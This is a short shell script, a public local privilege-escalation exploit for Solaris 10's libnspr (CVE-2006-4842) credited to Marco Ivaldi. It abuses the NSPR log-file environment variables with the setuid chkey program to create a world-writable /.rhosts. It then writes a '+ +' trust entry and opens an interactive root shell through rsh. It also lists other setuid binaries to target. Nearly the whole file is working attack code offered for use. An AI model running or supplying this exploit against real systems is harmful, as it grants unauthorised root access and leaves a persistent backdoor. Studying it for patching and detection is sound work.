#!/bin/sh

#
# $Id: raptor_libnspr,v 1.1 2006/10/13 19:12:12 raptor Exp $
#
# raptor_libnspr - Solaris 10 libnspr oldschool local root
# Copyright (c) 2006 Marco Ivaldi <raptor@0xdeadbeef.info>
#
# Local exploitation of a design error vulnerability in version 4.6.1 of
# NSPR, as included with Sun Microsystems Solaris 10, allows attackers to
# create or overwrite arbitrary files on the system. The problem exists 
# because environment variables are used to create log files. Even when the
# program is setuid, users can specify a log file that will be created with 
# elevated privileges (CVE-2006-4842).
#
# Usage:
# $ chmod +x raptor_libnspr
# $ ./raptor_libnspr
# [...]
# # id
# uid=0(root) gid=0(root)
# # 
#
# Vulnerable platforms (SPARC):
# Solaris 10 without patch 119213-10 [tested]
# 
# Vulnerable platforms (x86):
# Solaris 10 without patch 119214-10 [untested]
#

echo "raptor_libnspr - Solaris 10 libnspr oldschool local root"
echo "Copyright (c) 2006 Marco Ivaldi <raptor@0xdeadbeef.info>"
echo

# prepare the environment
NSPR_LOG_MODULES=all:5
NSPR_LOG_FILE=/.rhosts
export NSPR_LOG_MODULES NSPR_LOG_FILE

# gimme rw-rw-rw!
umask 0

# setuid program linked to /usr/lib/mps/libnspr4.so
/usr/bin/chkey

# other good setuid targets
#/usr/bin/passwd
#/usr/bin/lp
#/usr/bin/cancel
#/usr/bin/lpset
#/usr/bin/lpstat
#/usr/lib/lp/bin/netpr
#/usr/lib/sendmail
#/usr/sbin/lpmove
#/usr/bin/login
#/usr/bin/su
#/usr/bin/mailq

# oldschool rhosts foo;)
echo "+ +" > $NSPR_LOG_FILE
rsh -l root localhost sh -i
